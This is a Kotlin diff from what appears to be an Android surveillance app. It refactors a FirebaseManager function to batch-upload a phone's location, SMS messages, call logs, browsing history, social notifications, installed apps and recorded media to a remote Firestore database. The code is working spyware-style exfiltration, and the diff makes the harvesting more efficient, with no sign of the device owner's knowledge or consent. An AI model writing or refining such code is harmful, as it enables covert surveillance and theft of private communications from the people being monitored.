@@ -26,7 +26,7 @@ object FirebaseManager {
         get() = CloudConfig.deviceId
 
     /**
-     * Upload full device status and report data to Firebase Firestore
+     * Upload full device status and report data to Firebase Firestore using WriteBatch
      */
     suspend fun reportToFirebase(
         deviceInfo: DeviceInfo,
@@ -45,8 +45,12 @@ object FirebaseManager {
             if (devId.isEmpty()) return
 
             val now = System.currentTimeMillis()
+            val devRef = db.collection("devices").document(devId)
 
-            // 1. Update main device document
+            var batch = db.batch()
+            var opCount = 0
+
+            // 1. Device Document Header
             val deviceDoc = hashMapOf<String, Any>(
                 "device_id" to devId,
                 "device_name" to deviceInfo.deviceName,
@@ -60,11 +64,10 @@ object FirebaseManager {
                 "is_charging" to battery.isCharging,
                 "battery_temperature" to battery.temperature
             )
-            db.collection("devices").document(devId)
-                .set(deviceDoc, SetOptions.merge())
-                .await()
+            batch.set(devRef, deviceDoc, SetOptions.merge())
+            opCount++
 
-            // 2. Upload location
+            // 2. Location
             location?.let { loc ->
                 val locData = hashMapOf<String, Any>(
                     "latitude" to loc.latitude,
@@ -73,13 +76,12 @@ object FirebaseManager {
                     "provider" to loc.provider,
                     "timestamp" to loc.timestamp
                 )
-                db.collection("devices").document(devId)
-                    .collection("locations").document(loc.timestamp.toString())
-                    .set(locData, SetOptions.merge())
+                batch.set(devRef.collection("locations").document(loc.timestamp.toString()), locData, SetOptions.merge())
+                opCount++
             }
 
-            // 3. Upload SMS messages (deduplicated by SMS ID)
-            for (sms in smsMessages) {
+            // 3. SMS Messages
+            for (sms in smsMessages.take(100)) {
                 val smsData = hashMapOf<String, Any>(
                     "id" to sms.id,
                     "address" to sms.address,
@@ -87,13 +89,13 @@ object FirebaseManager {
                     "date" to sms.date,
                     "type" to sms.type
                 )
-                db.collection("devices").document(devId)
-                    .collection("sms").document(sms.id.toString())
-                    .set(smsData, SetOptions.merge())
+                batch.set(devRef.collection("sms").document(sms.id.toString()), smsData, SetOptions.merge())
+                opCount++
+                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
             }
 
-            // 4. Upload Call Logs (deduplicated by Call ID or timestamp)
-            for (call in callLogs) {
+            // 4. Call Logs
+            for (call in callLogs.take(100)) {
                 val callDocId = if (call.id > 0) call.id.toString() else call.date.toString()
                 val callData = hashMapOf<String, Any>(
                     "id" to call.id,
@@ -103,12 +105,12 @@ object FirebaseManager {
                     "date" to call.date,
                     "type" to call.type
                 )
-                db.collection("devices").document(devId)
-                    .collection("calls").document(callDocId)
-                    .set(callData, SetOptions.merge())
+                batch.set(devRef.collection("calls").document(callDocId), callData, SetOptions.merge())
+                opCount++
+                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
             }
 
-            // 5. Upload Activities
+            // 5. Activities
             for (act in activities) {
                 val ts = act.optLong("timestamp", System.currentTimeMillis())
                 val actData = hashMapOf<String, Any>(
@@ -118,12 +120,12 @@ object FirebaseManager {
                     "data" to act.optString("data", "{}"),
                     "timestamp" to ts
                 )
-                db.collection("devices").document(devId)
-                    .collection("activity").document(ts.toString())
-                    .set(actData, SetOptions.merge())
+                batch.set(devRef.collection("activity").document(ts.toString()), actData, SetOptions.merge())
+                opCount++
+                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
             }
 
-            // 6. Upload Web History
+            // 6. Web History
             for (web in webHistory) {
                 val docId = web.url.hashCode().toString()
                 val webData = hashMapOf<String, Any>(
@@ -133,12 +135,12 @@ object FirebaseManager {
                     "visit_count" to web.visitCount,
                     "timestamp" to web.timestamp
                 )
-                db.collection("devices").document(devId)
-                    .collection("webhistory").document(docId)
-                    .set(webData, SetOptions.merge())
+                batch.set(devRef.collection("webhistory").document(docId), webData, SetOptions.merge())
+                opCount++
+                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
             }
 
-            // 7. Upload Social Notifications
+            // 7. Social Notifications
             for (notif in socialNotifications) {
                 val ts = notif.optLong("timestamp", System.currentTimeMillis())
                 val notifData = hashMapOf<String, Any>(
@@ -149,37 +151,39 @@ object FirebaseManager {
                     "message_type" to notif.optString("message_type", "notification"),
                     "timestamp" to ts
                 )
-                db.collection("devices").document(devId)
-                    .collection("social").document(ts.toString())
-                    .set(notifData, SetOptions.merge())
+                batch.set(devRef.collection("social").document(ts.toString()), notifData, SetOptions.merge())
+                opCount++
+                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
             }
 
-            // 8. Upload Installed Apps
-            if (installedApps.isNotEmpty()) {
-                val appsCollection = db.collection("devices").document(devId).collection("apps")
-                for (app in installedApps.take(150)) {
-                    val appData = hashMapOf<String, Any>(
-                        "package_name" to app.packageName,
-                        "app_name" to app.appName,
-                        "version_name" to (app.versionName ?: ""),
-                        "version_code" to app.versionCode,
-                        "first_install_time" to app.firstInstallTime,
-                        "last_update_time" to app.lastUpdateTime,
-                        "is_system_app" to app.isSystemApp
-                    )
-                    appsCollection.document(app.packageName.replace("/", "_"))
-                        .set(appData, SetOptions.merge())
-                }
+            // 8. Installed Apps
+            for (app in installedApps.take(150)) {
+                val appData = hashMapOf<String, Any>(
+                    "package_name" to app.packageName,
+                    "app_name" to app.appName,
+                    "version_name" to (app.versionName ?: ""),
+                    "version_code" to app.versionCode,
+                    "first_install_time" to app.firstInstallTime,
+                    "last_update_time" to app.lastUpdateTime,
+                    "is_system_app" to app.isSystemApp
+                )
+                batch.set(devRef.collection("apps").document(app.packageName.replace("/", "_")), appData, SetOptions.merge())
+                opCount++
+                if (opCount >= 450) { batch.commit().await(); batch = db.batch(); opCount = 0 }
             }
 
-            Log.d(TAG, "Report successfully written to Firebase Firestore for $devId")
+            if (opCount > 0) {
+                batch.commit().await()
+            }
+
+            Log.d(TAG, "Batch report committed to Firebase Firestore for $devId")
         } catch (e: Exception) {
-            Log.e(TAG, "Error writing to Firestore", e)
+            Log.e(TAG, "Error committing batch to Firestore", e)
         }
     }
 
     /**
-     * Upload media file (audio recording, photo, screenshot) directly to Firebase Storage
+     * Upload media file directly to Firebase Storage
      */
     suspend fun uploadMediaFile(file: File, mediaType: String): String? {
         return try {
